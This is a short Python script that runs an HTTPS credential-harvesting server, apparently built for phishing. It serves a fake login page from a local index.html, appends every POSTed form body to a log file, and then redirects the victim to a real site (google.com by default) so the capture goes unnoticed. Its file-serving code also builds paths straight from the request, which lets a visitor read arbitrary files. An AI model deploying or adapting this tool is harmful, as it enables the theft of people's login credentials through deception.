#!/usr/bin/python
from SimpleHTTPServer import SimpleHTTPRequestHandler
import requests, SocketServer, ssl, os
from pwn import *
from sys import argv


context.log_level = 'info'


class Handler(SimpleHTTPRequestHandler):
    def __init__(self, req, client_addr, server):
        self.target = server.target
        SimpleHTTPRequestHandler.__init__(self, req, client_addr, server)

    def do_GET(self):
        log.debug('received connection')
        if self.path == '/' or self.path == '/index.html':
            self.send_response(302)
            self.send_header("Location", "/login")
            self.end_headers()
        else:
            if self.path.lower() == '/login':
              self.path = './index.html'
            else:
                self.path = '%s%s' % (os.getcwd(), self.path)
            response = open(self.path, 'rb').read()
            self.send_response(200)
            if '.ico' in self.path or '.png' in self.path:
                self.send_header("Content-type", "binary/octet-stream")
            else:
                self.send_header("Content-type", "text/html")
            self.send_header("Content-length", len(response))
            self.end_headers()
            self.wfile.write(response)

    def do_POST(self):
        log.debug('received connection')
        body = self.rfile.read(int(self.headers["Content-Length"]))
        open('https_posts.log', 'a').write(body)
        self.send_response(302)
        self.send_header("Location", self.target)
        self.end_headers()


class HttpsServer(SocketServer.TCPServer):
    def __init__(self, target='', ip_address='0.0.0.0', port=443):
        self.target = target
        SocketServer.TCPServer.__init__(self, (ip_address, port), Handler)
        self.socket = ssl.wrap_socket (self.socket, certfile='./server.pem', server_side=True)

    def start_limited(self):
        self.handle_request()
        return self

    def start(self):
        self.serve_forever()
        return self


if __name__ == '__main__':
    server = HttpsServer(target="https://google.com/")
    server.start()
    # server.start_limited()
